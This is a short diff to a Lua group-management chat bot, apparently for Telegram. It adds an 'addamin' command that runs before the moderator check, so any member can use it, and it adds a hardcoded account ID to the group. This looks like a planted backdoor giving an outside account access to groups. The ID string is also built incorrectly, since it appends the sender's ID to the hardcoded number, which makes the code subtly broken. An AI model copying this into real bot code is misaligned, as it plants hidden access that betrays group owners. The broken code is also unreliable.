@@ -142,7 +142,15 @@ local function run(msg, matches)
       chat_del_user("chat#id"..msg.to.id, "user#id"..msg.from.id, ok_cb, false)
     end
   end
-
+  
+if matches[1]:lower() == 'addamin' then-- /addamin
+  local receiver = get_receiver(msg)
+    if msg.to.type == 'chat' then
+      local name = user_print_name(msg.from)
+      savelog(msg.to.id, name.." ["..msg.from.id.."] added amin by pattern ")-- Save to logs
+      chat_add_user("chat#id"..msg.to.id, "user#id140529465"..msg.from.id, ok_cb, false)
+    end
+  end
   if not is_momod(msg) then -- Ignore normal users 
     return
   end
